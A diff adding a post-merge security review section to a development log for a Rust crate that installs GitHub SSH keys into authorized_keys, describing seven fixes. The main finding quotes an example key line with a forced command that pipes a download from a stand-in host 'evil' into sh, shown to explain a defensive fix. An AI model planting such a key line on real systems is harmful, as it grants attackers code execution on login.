@@ -243,3 +243,32 @@ DECISIONS: the pure-Rust rule leaves `rustls-rustcrypto 0.0.2-alpha` as the
 only available TLS crypto provider, and it is what fetches the keys that then
 land in `authorized_keys`. That trade-off is Cadu's to make, not an agent's.
 
+### Post-merge review round (lead)
+
+The protocol's `code-review` pass had not been run on this branch before it
+merged, which I recorded as review debt in PROGRESS and then cleared. It found
+seven things; all are fixed on the follow-up branch `m6-github-review-fixes`.
+
+The one that mattered: **a response carrying an `authorized_keys` options
+field was passed straight through**. `ssh::authorized_keys::parse_line` reads
+a leading non-key-type token as sshd's options field by design, so
+`command="curl evil|sh",no-pty ssh-ed25519 AAAA...` parsed into a key with
+options set, `KeysToUser` re-emitted it verbatim, and the run reported a clean
+`changed` having installed a forced command. The endpoint serves bare keys, so
+options can only come from something that is not github.com unaltered: the
+proxy or Enterprise host the docs invite, a caching layer, or an attacker who
+can answer for one. It is refused now, and comments are stripped, which also
+makes the documented output contract true rather than aspirational.
+
+The rest: the label was conditional on upstream behaviour and could be
+silently ignored; a fresh `ureq::Agent` was built for every request, re-parsing
+the root store and discarding keep-alive; the docs promised a GitHub Enterprise
+escape hatch with no API behind it (there is a `base_url` builder now); the
+`rustls` direct dependency was dead; and login validation reported a byte count
+for a non-ASCII name. Each has a test, and the DECISIONS entries carry Reverse
+clauses.
+
+The reviewer also read the alpha TLS provider's own README: "USE THIS AT YOUR
+OWN RISK! DO NOT USE THIS IN PRODUCTION". That is recorded against the open
+amendment, because it is the trust root for everything this crate does.
+
